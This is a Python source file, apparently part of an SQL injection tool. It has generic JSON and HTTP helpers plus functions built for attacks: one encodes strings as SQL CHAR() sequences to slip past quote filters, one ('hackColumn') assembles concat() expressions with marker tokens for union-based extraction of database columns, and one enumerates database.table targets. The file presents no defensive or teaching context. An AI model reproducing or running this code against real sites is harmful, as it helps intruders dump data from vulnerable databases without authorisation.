import json
import requests
import re

class App:
    def __init__(self):
        pass

    def getJSON(self, url):
        content = ''
        try:
            with open(url, 'r') as str_file:
                content = str_file.read()
        except :
            self.setJSON(url, {})
            content = '{}'
        return json.loads(content)

    def setJSON(self, url, data):
        with open(url, 'w') as f:
            f.write(json.dumps(data))

    def sendRequest(self, url, obj, type=1):
        req = ''
        if type == 1 or type == 'POST':
            req = requests.post(url, data=obj).text
        if type == 2 or type == 'GET' or type == '':
            req = requests.get(url, data=obj).text
        if type == 3 or type == 'PUT':
            req = requests.put(url, data=obj).text
        return req

    def joinURL(self, url, url2):
        if re.search(r"(?:(?:https?|ftp)://)", url2):
            return url2
        else:
            return requests.compat.urljoin(url,url2)

    def parseCHAR(self, arr, sep):
        char=''
        size = len(arr)
        for i in range(0, size):
            char = char + 'CHAR('+ str(ord(arr[i])) +')'
            if i != size-1:
                char = char + sep
        return char

    def hackColumn(self, arr, token, sep):
        side = self.parseCHAR(token, sep)
        l = len(arr)
        cat = v = ''
        for i in range(0, l):
            cat += v + arr[i]
            v = sep
            if i+1 < l:
                cat += sep + self.parseCHAR('|', sep)
        cat = 'concat('+side + sep + cat + sep + side+')'
        return cat

    def joinDBTB(self, obj):
        nArray = []
        try:
            for i in range(0, len(obj["database"])):
                for j in range(0, len(obj["table"])):
                    nArray.append(obj["database"][i]+'.'+obj["table"][j])
        except:
            nArray = None
        return nArray

    def isCredential(self, val):
        __regex = re.compile(
            r"^(?=[a-zA-Z0-9._]{3,32}$)(?!.*[_.]{2})[^_.].*[^_.]$"
        )
        __pattern = re.compile(__regex)
        boo = __pattern.match(val)
        return bool(boo)